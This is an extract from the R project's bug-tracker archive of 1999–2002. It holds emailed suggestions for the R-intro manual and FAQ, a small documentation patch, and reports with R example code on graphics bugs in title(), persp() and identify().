	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id VAA14694
	for <r-bugs@biostat.ku.dk>; Mon, 18 Jun 2001 21:03:08 +0200 (MET DST)
Received: from ku.edu by lark.cc.ku.edu (8.8.8/1.1.8.2/12Jan95-0207PM)
	id OAA0000024737; Mon, 18 Jun 2001 14:02:11 -0500 (CDT)
Sender: pauljohn@lark.cc.ku.edu
Message-ID: <3B2E4F06.F3198537@ku.edu>
Date: Mon, 18 Jun 2001 13:57:10 -0500
From: "Paul E. Johnson" <pauljohn@ku.edu>
X-Mailer: Mozilla 4.77 [en] (X11; U; Linux 2.4.2-2 i686)
X-Accept-Language: en
MIME-Version: 1.0
To: r-bugs@biostat.ku.dk
Subject: input for R-intro
Content-Type: multipart/mixed;
 boundary="------------1C95DB321C5D7CBC643B8CA3"

This is a multi-part message in MIME format.
--------------1C95DB321C5D7CBC643B8CA3
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

I asked Prof. Brian Ripley if I might submit some text/input for the
R-intro writers, he said this is the place to do it.

I was on a plane a couple of weeks ago reading R-intro as I plan for a
course and made these notes, some of which I think will help my students
if you incorporate them.  I've attached a raw text file I wrote in Emacs
to this message "Rintrochanges.txt".

I have written documents like R-intro before and understand it is
difficult to please everybody, and I thank you for your effort on the
project.

Paul Johnson
Assoc. Professor
Dept. of Political Science
University of Kansas

--------------1C95DB321C5D7CBC643B8CA3
Content-Type: text/plain; charset=us-ascii;
 name="Rintrochanges.txt"
Content-Transfer-Encoding: 7bit
Content-Disposition: inline;
 filename="Rintrochanges.txt"

R-intro comments/enhancements  Part I.

I think something more verbose like this would help under
"Ordered and Unordered factors"

Texts on research design emphasize that variables have
different levels of measurement. Typically, there are three levels.
If a measurement is taken with a precise scale (one on which it is
meaningful to say new_value = b*old_value, as with readings of a
thermometer), it is considered an "interval" level variable.  Many
statistical models were originally designed for interval level
variables.  If a measurement is not so precise, but only provides an
ordered categorization of observations, such as "low" "medium" and
"high", it is called an ordinal variable.  If a measurement is
categorical and implies no sense of ordering, such as "European",
"Asian", or "South American", then it is typically called an ordinal
variable.  Assigning the values of "1", "2", and "3" to these
observations has no substantive significance, as we might as well
number them "3","2","1".

Many statistical models are designed for interval level data, but with
appropriate recoding of input, they can also be made to work with
nominal and ordinal data.  In the "old days" of statistical computing,
users were forced to create a lot of indicator (or "dummy") variables,
thereby converting information from nominal or ordinal measurements
into variables that have only values 0 and 1.  For example, to
represent the information about the home continents of survey
respondents, we might create two dummy variables, one for Asia (coded
1 if respondent is from Asia, 0 otherwise) and one for South America
(likewise 0 and 1).  A respondent for whom we find both of these dummy
variables equal to 0 is sure to be from Europe, so we don't usually
need to create three dummy variables.  Doing so would be redundant.

With a modern language like R, much of the drudgery of creating the
indicator variables is handled automatically if the user declares the
variables properly.  In R, and S before it, the term "factor" is used
to refer to a variable that is not measured at the interval level. An
"unordered factor" is a nominal (or categorical) variable, while an
"ordered factor" is the term for an ordinal measurement.  Many
statistical procedures in R have builtin procedures for handling
factors.

Beyond handling coding of noninterval variables, factors play a vital
role in many R procedures.  Procedures can be designed to do a chore
for each value of a factor.  Many procedures will in fact insist that
a variable be designated as a factor.

 ------------------


In this section "Named arguments and defaults", I am left in a
confusion about a few things.  This confusion has bothered me a while.
Can you do more to explain which arguments must be specified, which
are optional, and under what conditions is it necessary to include the
parameter= which calling a function.

1.  When I use a function, and I look in its help page, how do I know
which input variables must be declared and which can be ignored?  This
is quite mysterious.  When invocations leave out some arguments, how
does R "sift through" the ones that are provided to know which is
which?


For example, consider the page on "update.packages".  

Under Usage, I find:
update.packages(lib.loc = .lib.loc, CRAN = getOption("CRAN"),
                contriburl = contrib.url(CRAN),
                method = "auto", instlib = NULL,
                ask=TRUE, available=NULL, destdir=NULL)

I've been using computers a long time, and I use this function every two months or so.  Between times I forget, come back to this page, and still this one leaves me totally confused.  

After fiddling a while, I find this works on Linux:
>update.packages(lib="/usr/lib/R/library",CRAN="http://lib.stat.cmu.edu/R/CRAN")

but what bothered me thd most is the "getOption("CRAN") option for CRAN.  I tried many variations on that and never figured how to make it work.


Maybe any clarifications could be related to the section "Getting help with functions and features"

In this section, I think it would be nice to have a paragraph about
"how to read a help page."  Some things are not obvious to all new
users.  Some things in help pages are tough to describe... Maybe I'd
say

How to read a help page.

If you find a help page, notice that it is made up of different parts.

1. "Description". These are usually terse, so read every word
   carefully.

2. Look for the "Value" heading.  That tells you what this procedure is
   going to return when you call it. If this procedure doesn't return
   what you need, you should find out immediately.

3. Under "Usage", most help pages list a number of possible commands
   that can be used.  These are not commands to be typed
   literally. Many of them contain abstract references which provide
   information about the nature of the variables that might be
   entered.  

   Here is a simple case.  The coefficients help page has this:

Usage

coef(object, ...)
coefficients(object, ...)

   Clearly, coef and coefficients are going to do the same thing, and you must supply the appropriate object.

4. Under "Arguments," the help page indicates what inputs this
   procedure wants.  The inputs are described line-by-line, and often
   the comments indicate of parameters are optional or what their
   default value might be.

   Many help pages have the infamous "...", which is something like
   "fill in the appropriately, depending on whatever context you
   find."  In some situations this is easy to understand .  Many help
   pages will eplicitly say that "..." refers to any options that
   might be used with a particular kind of object, and in that case
   one must find the help page for that other object. For example, the
   dev.copy help page clearly indicates that "..." refers to any
   options that might be used with the particular device in question.

   Other help pages are not so informative.  Consider the output from ?coefficients:

Arguments

 object
       an object for which the extraction of model coefficients is meaningful.
 ...
       other arguments.

Here it is clear you need to give a statistical object to have
coefficients removed.  The "..." is a mystery, and most R users will
try to use the coefficients command without worrying about it, and
then backtrack if an error occurs.  And, if an error occurs, there may be no recourse but to read the source code for this command or ask  about it in the r-help email list.

--------------1C95DB321C5D7CBC643B8CA3--


==> 988.audit <==
Tue Jun 19 09:07:09 2001	ripley	moved from incoming to Documentation
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1011 *
Subject: R-intro suggestions part II
From: "Paul E. Johnson" <pauljohn@ukans.edu>
Date: Tue, 03 Jul 2001 15:50:06 -0500
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1011 <==
From pauljohn@ukans.edu  Tue Jul  3 22:55:21 2001
Received: from lark.cc.ku.edu (root@lark.cc.ku.edu [129.237.34.2])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id WAA25420
	for <r-bugs@biostat.ku.dk>; Tue, 3 Jul 2001 22:55:20 +0200 (MET DST)
Received: from ukans.edu by lark.cc.ku.edu (8.8.8/1.1.8.2/12Jan95-0207PM)
	id PAA0000007085; Tue, 3 Jul 2001 15:55:12 -0500 (CDT)
Sender: pauljohn@lark.cc.ku.edu
Message-ID: <3B422FFE.F4450D57@ukans.edu>
Date: Tue, 03 Jul 2001 15:50:06 -0500
From: "Paul E. Johnson" <pauljohn@ukans.edu>
X-Mailer: Mozilla 4.77 [en] (X11; U; Linux 2.4.2-2 i686)
X-Accept-Language: en
MIME-Version: 1.0
To: r-bugs@biostat.ku.dk
Subject: R-intro suggestions part II
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

Brian Ripley said that, if I sent these here, they might find their way
to the R-intro team.  So, here is another installment:


Concerning this section:

Data permanency and removing objects.

This is the first place R-intro discusses objects.  I was thinking a
better discussion of objects and syntax is needed, perhaps here, or in
the later section "Objects, their modes and attributes."  I suggest
this:


The fact that R is an object-oriented approach to programming for
statistical analysis has pervasive implications.  If one has studied a
programming language like Java or C++, the notions of object and
method are not new.  For readers who have not studied languages like
that, perhaps we can offer a brief explanation.  An object is a "self
contained data holder" that can follow instructions (do calculations,
provide values).  One intention of this design is to keep things
separate if they belong that way, to reduce the risk that one
calculation accidentally influences the result of another.
Object-orientation also has important implications for the way the
different parts of a program fit together.  Since an object is
supposed to be able to carry out a certain set of actions (which are
called methods, but in R one often says "functions" or "procedures"),
then both the user and the programmer understand what the object can
be expected to do.  There are numerous implications of object
orientation that come into play "under the hood" of the R statistical
engine, but it is not important to delve into them from a user's point
of view.


There is one wrinkle about the syntax of R that we hasten to
emphasize.  In object-oriented computer languages, syntax typically
puts the object first, followed by the instruction, followed any needed
parameters.  In Java, to tell the object "regression" to calculate
estimates for vectors y and x, one would write something like:

   regression.estimate(y,x);

Assuming that object's class has an "estimate" method which knows how
to handle the input, we would be in business.

In R, the syntax is totally different.  Instead of thinking of the
object itself as the primary thing, the syntax in R is designed to use
the method name--the instruction--as the leading concept, and then the
object that is being acted upon is given as a parameter.

When a model gives a result in R, the result is almost invariably an
object, which can then be "poked and prodded" with other methods.
If a linear regression is calculated, for example:

resultObject <- lm(y~x)

the return value is an object.  But, unlike other object-oriented
languages, in R one would write summary(resultObject), or
coefficients(resultObject), rather than the Java style
result_object.summary() or some such thing, in order to investigate the
result.


Paul E. Johnson
Political Science
University of Kansas


==> 1011.audit <==
Fri Aug  3 11:30:05 2001	ripley	moved from incoming to Documentation
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1136 *
Subject: cex/col/etc. in title(): documentation?
From: Ben Bolker <ben@zoo.ufl.edu>
Date: Mon, 22 Oct 2001 11:55:14 -0400 (EDT)
--MM:actually the documentation still could elaborate a bit..
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1136 <==
From postmaster@franz.stat.wisc.edu  Mon Oct 22 17:51:05 2001
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id RAA09751
	for <r-bugs@biostat.ku.dk>; Mon, 22 Oct 2001 17:51:04 +0200 (MET DST)
Received: from smtp.ufl.edu (really [128.227.74.28]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m15vhLx-000JL0C@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
	for <r-bugs@r-project.org>; Mon, 22 Oct 2001 10:51:01 -0500 (CDT) 
Received: from bolker.zoo.ufl.edu (bolker.zoo.ufl.edu [10.227.60.45])
	by smtp.ufl.edu (8.12.1/8.12.1/2.2.3) with ESMTP id f9MFoxir117294
	for <r-bugs@r-project.org>; Mon, 22 Oct 2001 11:51:00 -0400
Date: Mon, 22 Oct 2001 11:55:14 -0400 (EDT)
From: Ben Bolker <ben@zoo.ufl.edu>
Reply-To: <bolker@zoo.ufl.edu>
To: <r-bugs@r-project.org>
Subject: cex/col/etc. in title(): documentation?
Message-ID: <Pine.LNX.4.30.0110221153480.5576-100000@bolker.zoo.ufl.edu>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII


  There appears to be a mismatch between the documentation and behavior of
title(), or at least a clarification is in order.  The documentation says
you can pass extra arguments from par() as "...".  However, cex at least
is ignored. Later on in the documentation it becomes clear that you can
specify these extra parameters as part of a list.

  I wouldn't say this is necessarily a bug (and there's certainly a way to
do what you want, if you read the rest of the documentation), but I will
say it didn't seem to follow the same conventions as most of the rest of
the graphical annotation in R.  I would have expected
title(main="foo",cex=2) to set the title larger ...

  I think it would be nicer if title() worked this way, but if it doesn't
it would be nice to have an additional note in the documentation for "..."
to the effect that parameters such as cex, col, etc., should be set using
the list mechanism described below.

## setting parameter with par(): works
par(mfrow=c(3,3),cex=1)
for (i in 1:9) {
  plot(0:5)
  par(cex=i)
  title(main="hello")
  par(cex=1)
}

## passing parameter as part of a list: works
par(mfrow=c(3,3),cex=1)
for (i in 1:9) {
  plot(0:5)
  title(main=list("hello",cex=i))
  par(cex=1)
}

## passing cex as an additional arg: doesn't work
par(mfrow=c(3,3))
for (i in 1:9) {
  plot(0:5)
  title(main="hello",cex=i)
}


--please do not edit the information below--

Version:
 platform = i686-pc-linux-gnu
 arch = i686
 os = linux-gnu
 system = i686, linux-gnu
 status =
 major = 1
 minor = 3.1
 year = 2001
 month = 08
 day = 31
 language = R

Search Path:
 .GlobalEnv, package:bbfuns, package:cannib, package:ctest, Autoloads, package:base
-- 
318 Carr Hall                                bolker@zoo.ufl.edu
Zoology Department, University of Florida    http://www.zoo.ufl.edu/bolker
Box 118525                                   (ph)  352-392-5697
Gainesville, FL 32611-8525                   (fax) 352-392-3704


==> 1136.reply.1 <==
From maechler@stat.math.ethz.ch  Wed Oct 31 11:23:39 2001
Received: from stat.math.ethz.ch (daemon@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id LAA12222
	for <R-bugs@biostat.ku.dk>; Wed, 31 Oct 2001 11:23:38 +0100 (MET)
Received: (from daemon@localhost)
	by stat.math.ethz.ch (8.9.1/8.9.1) id LAA03711;
	Wed, 31 Oct 2001 11:23:33 +0100 (MET)
Received: from lynne(129.132.58.30), claiming to be "lynne.ethz.ch"
 via SMTP by hypatia, id smtpdAAAa000tx; Wed Oct 31 11:23:32 2001
Received: (from maechler@localhost)
	by lynne.ethz.ch (8.11.6/8.11.2) id f9VANWH32397;
	Wed, 31 Oct 2001 11:23:32 +0100
X-Authentication-Warning: lynne.ethz.ch: maechler set sender to maechler@stat.math.ethz.ch using -f
From: Martin Maechler <maechler@stat.math.ethz.ch>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Message-ID: <15327.53539.457975.641217@gargle.gargle.HOWL>
Date: Wed, 31 Oct 2001 11:23:31 +0100
To: Ben Bolker <bolker@zoo.ufl.edu>
Cc: R-bugs@biostat.ku.dk
Subject: Re: [Rd] cex/col/etc. in title(): documentation? (PR#1136)
In-Reply-To: <200110221551.RAA09762@pubhealth.ku.dk>
References: <200110221551.RAA09762@pubhealth.ku.dk>
X-Mailer: VM 6.95 under Emacs 20.7.1
Reply-To: Martin Maechler <maechler@stat.math.ethz.ch>

>>>>> "Ben" == Ben Bolker <bolker@zoo.ufl.edu> writes:

    Ben>   There appears to be a mismatch between the documentation and
    Ben> behavior of title(), or at least a clarification is in order.  The
    Ben> documentation says you can pass extra arguments from par() as
    Ben> "...".  However, cex at least is ignored. Later on in the
    Ben> documentation it becomes clear that you can specify these extra
    Ben> parameters as part of a list.

No bug.  Here's the clarification:

Contrary to the other implementations of S,
R differentiates different usages of "cex", "col" and "font" :

 > .Pars[grep("^cex",.Pars)]
 [1] "cex"      "cex.axis" "cex.lab"  "cex.main" "cex.sub" 
 > .Pars[grep("^col",.Pars)]
 [1] "col"      "col.axis" "col.lab"  "col.main" "col.sub" 
 > .Pars[grep("^font",.Pars)]
 [1] "font"      "font.axis" "font.lab"  "font.main" "font.sub" 

and ?par *does* document this.

Hence the "..." in axis() should really be ``filled'' with cex.axis, etc.

    Ben>   I wouldn't say this is necessarily a bug (and there's certainly
    Ben> a way to do what you want, if you read the rest of the
    Ben> documentation), but I will say it didn't seem to follow the same
    Ben> conventions as most of the rest of the graphical annotation in R.
    Ben> I would have expected title(main="foo",cex=2) to set the title
    Ben> larger ...

The following is an example demonstrating R's possibilities 
    (not as cleanly possible in S-plus AFAIK):

plot(1, col.axis = "sky blue", col.lab = "thistle")
title("Main Title", sub = "sub title", 
      cex.main = 2,   font.main= 4, col.main= "blue",
      cex.sub = 0.75, font.sub = 3, col.sub = "red")

Martin Maechler <maechler@stat.math.ethz.ch>	http://stat.ethz.ch/~maechler/
Seminar fuer Statistik, ETH-Zentrum  LEO D10	Leonhardstr. 27
ETH (Federal Inst. Technology)	8092 Zurich	SWITZERLAND
phone: x-41-1-632-3408		fax: ...-1228			<><

==> 1136.audit <==
Wed Oct 31 11:32:57 2001	maechler	changed notes
Wed Oct 31 11:32:57 2001	maechler	foobar
Wed Oct 31 11:32:57 2001	maechler	moved from incoming to Documentation
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1772 *
Subject: bug(?) in R FAQ - Should I run R from within Emacs?
From: Tim.Harrold@csiro.au
Date: Thu, 11 Jul 2002 18:21:42 +1000
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1772 <==
From Tim.Harrold@csiro.au  Thu Jul 11 10:22:31 2002
Received: from bastion1.vic.csiro.au (bastion1.vic.CSIRO.AU [138.194.2.8])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id KAA17393
	for <r-bugs@biostat.ku.dk>; Thu, 11 Jul 2002 10:22:29 +0200 (MET DST)
From: Tim.Harrold@csiro.au
Received: from bastion1.vic.csiro.au (localhost [127.0.0.1])
	by bastion1.vic.csiro.au (8.11.4/8.11.4) with ESMTP id g6B8Ljv13431
	for <r-bugs@biostat.ku.dk>; Thu, 11 Jul 2002 18:21:45 +1000 (EST)
Received: from pcexch.dar.csiro.au (pcexch.dar.csiro.au [138.194.146.21])
	by bastion1.vic.csiro.au (8.11.4/8.11.4) with ESMTP id g6B8Lit13427;
	Thu, 11 Jul 2002 18:21:45 +1000 (EST)
Received: by pcexch.dar.csiro.au with Internet Mail Service (5.5.2653.19)
	id <33DQ5CHV>; Thu, 11 Jul 2002 18:21:43 +1000
Message-ID: <BE3FDFA0E846D311B264009027887568021F9571@pcexch.dar.csiro.au>
To: r-bugs@biostat.ku.dk
Cc: ripley@stats.ox.ac.uk
Subject: bug(?) in R FAQ - Should I run R from within Emacs?
Date: Thu, 11 Jul 2002 18:21:42 +1000
MIME-Version: 1.0
X-Mailer: Internet Mail Service (5.5.2653.19)
Content-Type: text/plain;
	charset="iso-8859-1"

I have a small request re.

R FAQ
Frequently Asked Questions on R
Version 1.5-10, 2002-06-13
ISBN 3-901167-51-X
Kurt Hornik


In section 6.2 Should I run R from within Emacs? The faq says

"Yes, definitely." 

This led me to install emacs, and to install ess. However, I use a windows
environment (mswindows2000) and I had some difficulty installing, linking
and launching these applications. After several hours I had launched emacs
but had failed to link it with either ess or r, partly because of platform
problems. (As a dedicated windows user, I am reluctant to tinker with
autoexec.bat and the like).

I spent several hours doing this, and in hindsight, I decided to uninstall
emacs and ess.
 
I would prefer if the faq could be changed to say:

"This is optional."

And perhaps some comment could be made about platforms. I found the
documentation for emacs and ess to be a bit of a hair-pulling exercise. NOT
one of the "plug and play" applications that MS windows is so fond of! 

By the way, I like the r gui very much. I used splus for some time as a PhD
student, and I was pleasantly surprised to find that my scripts run in r!! I
intend to use r from now onwards, and to encourage my colleagues to use it
too.

Kind regards,

Tim Harrold
CSIRO Atmospheric Research
107 Station Street Aspendale Vic 3195
Phone: 03 9239 4411  Fax: 03 9239 4688
Home: 03 9571 2736
email tim.harrold@csiro.au
"Give thanks to the Lord, for he is good."
Psalm 106:1 

==> 1772.audit <==
Wed Jul 17 09:19:26 2002	ripley	moved from incoming to Documentation
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2170 *
Subject: documentation: Missing paranthesis in reshape.Rd
From: lina@u.washington.edu
Date: Wed, 16 Oct 2002 08:36:07 +0200 (MET DST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2170 <==
From lina@u.washington.edu  Wed Oct 16 08:36:08 2002
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id IAA23896
	for <R-bugs@biostat.ku.dk>; Wed, 16 Oct 2002 08:36:07 +0200 (MET DST)
Date: Wed, 16 Oct 2002 08:36:07 +0200 (MET DST)
From: lina@u.washington.edu
Message-Id: <200210160636.IAA23896@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: documentation: Missing paranthesis in reshape.Rd

Full_Name: Michale Na Li
Version: 1.6.0
OS: i386-linux
Submission from: (NULL) (140.142.172.141)



In src/library/base/man/reshape.Rd, one paranthesis is missing, here is the
patch. 

*** reshape.Rd.old      2002-10-15 23:32:25.000000000 -0700
--- reshape.Rd  2002-10-15 23:32:35.000000000 -0700
***************
*** 12,18 ****
      idvar = "id", ids = 1:NROW(data),
      times = seq(length = length(varying[[1]])), 
      drop = NULL, direction, fix.row.names = TRUE,
!     split=list(regexp="\\.",include=FALSE)
  }
  %- maybe also `usage' for other objects documented here.
  \arguments{
--- 12,18 ----
      idvar = "id", ids = 1:NROW(data),
      times = seq(length = length(varying[[1]])), 
      drop = NULL, direction, fix.row.names = TRUE,
!     split=list(regexp="\\.",include=FALSE))
  }
  %- maybe also `usage' for other objects documented here.
  \arguments{




==> 2170.audit <==
Wed Oct 16 22:58:03 2002	ripley	moved from incoming to Documentation

==> 2170.reply.1 <==
From maechler@stat.math.ethz.ch  Thu Oct 17 18:52:55 2002
Received: from hypatia.math.ethz.ch (root@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id SAA08770
	for <R-bugs@biostat.ku.dk>; Thu, 17 Oct 2002 18:52:54 +0200 (MET DST)
Received: from lynne.ethz.ch (IDENT:root@lynne [129.132.58.30])
	by hypatia.math.ethz.ch (8.12.6/8.12.6) with ESMTP id g9HGqDC6009481;
	Thu, 17 Oct 2002 18:52:13 +0200 (MEST)
Received: (from maechler@localhost)
	by lynne.ethz.ch (8.11.6/8.11.2) id g9HGqCa30530;
	Thu, 17 Oct 2002 18:52:12 +0200
From: Martin Maechler <maechler@stat.math.ethz.ch>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Message-ID: <15790.60092.585263.812984@gargle.gargle.HOWL>
Date: Thu, 17 Oct 2002 18:52:12 +0200
To: lina@u.washington.edu
Cc: R-bugs@biostat.ku.dk
Subject: Re: documentation: Missing paranthesis in reshape.Rd (PR#2170)
In-Reply-To: <200210160636.IAA23901@pubhealth.ku.dk>
References: <200210160636.IAA23901@pubhealth.ku.dk>
X-Mailer: VM 7.07 under Emacs 21.2.1
Reply-To: Martin Maechler <maechler@stat.math.ethz.ch>

>>>>> "Michael" == Michael Na Li <lina@u.washington.edu>
>>>>>     on Wed, 16 Oct 2002 08:36:09 +0200 (MET DST) writes:

    Michael> Full_Name: Michale Na Li
    Michael> Version: 1.6.0
    Michael> OS: i386-linux
    Michael> Submission from: (NULL) (140.142.172.141)


    Michael> In src/library/base/man/reshape.Rd, one paranthesis
    Michael> is missing, here is the patch.

    Michael>  ..........

Thank you, Michael.

I've added that (and many spaces).
Martin
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Directory:  Graphics

* PR# 202 *
Subject: persp box occlusion bug
From: wsi@gcal.ac.uk
Date: Wed, 2 Jun 1999 15:02:03 +0200 (MET DST)
--The persp algorithm does not apply the occlusion rules to the frame, 
--which is always plotted first. 
--A bug, but not very simple to fix.
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 202 <==
From wsi@gcal.ac.uk  Wed Jun  2 15:02:10 1999
Received: from localhost (blueberry [130.225.108.193])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id PAA27126
	for <R-bugs@biostat.ku.dk>; Wed, 2 Jun 1999 15:02:03 +0200 (MET DST)
Date: Wed, 2 Jun 1999 15:02:03 +0200 (MET DST)
From: wsi@gcal.ac.uk
Message-Id: <199906021302.PAA27126@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: persp box occlusion bug

Full_Name: Bill Simpson
Version: 64.1
OS: linux
Submission from: (NULL) (193.62.250.209)


Bug in persp() bounding box:
If the surface being plotted extends below the lower z-axis boundary, the box
is
drawn with the wrong occlusion. The box is shown as being occluded by the
surface
even though it should be in front of the surface.

The box is correct for surface extending above the box. Problem is only for
surface extending below the box.

This exhibits the bug:

std<-rep(seq(-32,32,8),9)/1000 * 60
cf<-rep(seq(-32,32,8),rep(9,9))/1000 *60 
dp<-(cf-std)/.6
std<-unique(std)
cf<-unique(cf)
dp<-t(matrix(dp,length(cf),length(std)))
persp(std,cf,dp, xlim=c(-2,2), ylim=c(-2,2), zlim=c(0,5),theta=-40,    
phi=45,
box=TRUE,ltheta=-120, lphi=120,
d=1.5, shade=.7)


==> 202.audit <==
Wed Jun 30 19:31:18 1999	pd	moved from incoming to Graphics
Thu Jul 01 18:19:48 1999	pd	changed notes
Sun Feb 20 10:07:11 2000	ripley	changed notes
Mon Feb 28 17:17:51 2000	pd	changed notes
Mon Feb 28 17:18:28 2000	pd	changed notes
Mon Feb 28 17:19:35 2000	pd	changed notes
Mon Feb 28 17:20:17 2000	pd	changed notes
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 660 *
Subject: identify.default ignores any setting of cex.
From: Prof Brian Ripley <ripley@stats.ox.ac.uk>
Date: Fri, 15 Sep 2000 10:23:39 +0100 (BST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 660 <==
From postmaster@franz.stat.wisc.edu  Fri Sep 15 11:23:32 2000
Received: from stat.math.ethz.ch (daemon@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id LAA13327
	for <R-bugs@biostat.ku.dk>; Fri, 15 Sep 2000 11:23:32 +0200 (MET DST)
Received: (from daemon@localhost)
	by stat.math.ethz.ch (8.9.1/8.9.1) id LAA17846
	for <r-bugs@hypatia.math.ethz.ch>; Fri, 15 Sep 2000 11:23:49 +0200 (MET DST)
Received: from franz.stat.wisc.edu(128.105.174.95)
 via SMTP by hypatia, id smtpdAAAa004Mn; Fri Sep 15 11:23:42 2000
Received: from toucan.stats.ox.ac.uk (really [163.1.20.20]) by franz.stat.wisc.edu
	via in.smtpd with esmtp
	id <m13Zrkl-000IW0C@franz.stat.wisc.edu> (Debian Smail3.2.0.102)
	for <R-bugs@r-project.org>; Fri, 15 Sep 2000 04:25:51 -0500 (CDT) 
Received: from localhost (ripley@localhost)
	by toucan.stats.ox.ac.uk (8.9.0/8.9.0) with ESMTP id KAA14892
	for <R-bugs@r-project.org>; Fri, 15 Sep 2000 10:23:39 +0100 (BST)
X-Authentication-Warning: toucan.stats: ripley owned process doing -bs
Date: Fri, 15 Sep 2000 10:23:39 +0100 (BST)
From: Prof Brian Ripley <ripley@stats.ox.ac.uk>
X-Sender: ripley@toucan.stats
To: R-bugs@r-project.org
Subject: identify.default ignores any setting of cex.
Message-ID: <Pine.GSO.4.05.10009151011510.14885-100000@toucan.stats>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

R 1.1.1 on Windows, but I think this is widespread.

Using either

par(cex=0.5)
plot(1:10)
identify(1:10)

or

plot(1:10)
identify(1:10, cex=0.5)

ignores the cex setting.  The root cause is that par(cex=0.5)
alters cexbase for the device but sets cex=1.0, and the internal
text plotting routines use cex and not cexbase.

The obvious fix is to set cex to cexbase in do_identify. However,
if this is fixed, there is another problem, The offset of the label
is related to the cex in use for the label, and not for the symbol.
So

plot(1:10, type="n")
points(1:10, cex=5)
identify(1:10)

is not sensible in placing the labels.  That may be hard to anticipate,
but 

plot(1:10)
identify(1:10, cex=0.5)

needs to use cex=1 not cex=0.5 for the adjustment.  Perhaps identify is
trying too hard, and should give the user more control over the precise
position of the label (as S-PLUS does).

-- 
Brian D. Ripley,                  ripley@stats.ox.ac.uk
Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
University of Oxford,             Tel:  +44 1865 272861 (self)
1 South Parks Road,                     +44 1865 272860 (secr)
Oxford OX1 3TG, UK                Fax:  +44 1865 272595


==> 660.audit <==
Wed Oct 25 06:57:35 2000	ripley	moved from incoming to Graphics

==> 660.followup.1 <==
From ligges@statistik.uni-dortmund.de  Wed Apr 25 17:24:42 2001
Received: from nx5.HRZ.Uni-Dortmund.DE (nx5.HRZ.Uni-Dortmund.DE [129.217.131.21])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id RAA02114
	for <R-bugs@biostat.ku.dk>; Wed, 25 Apr 2001 17:24:42 +0200 (MET DST)
Received: from amadeus.statistik.uni-dortmund.de by nx5.HRZ.Uni-Dortmund.DE
          via smtp-local with ESMTP; Wed, 25 Apr 2001 17:24:51 +0200
Received: from statistik.uni-dortmund.de ([129.217.207.201])
	by amadeus.statistik.uni-dortmund.de (8.9.3+Sun/8.9.3) with ESMTP id RAA01760;
	Wed, 25 Apr 2001 17:24:50 +0200 (MET DST)
Message-ID: <3AE6EC55.6C1D8C7A@statistik.uni-dortmund.de>
Date: Wed, 25 Apr 2001 17:25:09 +0200
From: Uwe Ligges <ligges@statistik.uni-dortmund.de>
Organization: Fachbereich Statistik, Universitaet Dortmund
X-Mailer: Mozilla 4.76 [en] (WinNT; U)
X-Accept-Language: en
MIME-Version: 1.0
To: r-bugs <R-bugs@biostat.ku.dk>
CC: "Brian D. Ripley" <ripley@stats.ox.ac.uk>
Subject: Re: identify.default ignores any setting of cex (PR#660)
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

A follow-up to PR#660 (15 Sep 2000) from Brian Ripley:

> R 1.1.1 on Windows, but I think this is widespread.
>
> Using either
>
> par(cex=0.5)
> plot(1:10)
> identify(1:10)
>
> or
> 
> plot(1:10)
> identify(1:10, cex=0.5)
> 
> ignores the cex setting.  The root cause is that par(cex=0.5)
> alters cexbase for the device but sets cex=1.0, and the internal
> text plotting routines use cex and not cexbase.
> 
> The obvious fix is to set cex to cexbase in do_identify. However,
> if this is fixed, there is another problem, The offset of the label
> is related to the cex in use for the label, and not for the symbol.
> So
> 
> plot(1:10, type="n")
> points(1:10, cex=5)
> identify(1:10)
> 
> is not sensible in placing the labels.  That may be hard to anticipate,
> but 
> 
> plot(1:10)
> identify(1:10, cex=0.5)
> 
> needs to use cex=1 not cex=0.5 for the adjustment.  Perhaps identify is
> trying too hard, and should give the user more control over the precise
> position of the label (as S-PLUS does).


The same with 

 par(cex=1); plot(1:10); text(4, 5, "Hello World") # OK
 par(cex=2); plot(1:10); text(4, 5, "Hello World") # OK
 par(cex=2); plot(1:10); text(4, 5, "Hello World", cex = 1) # NOT OK
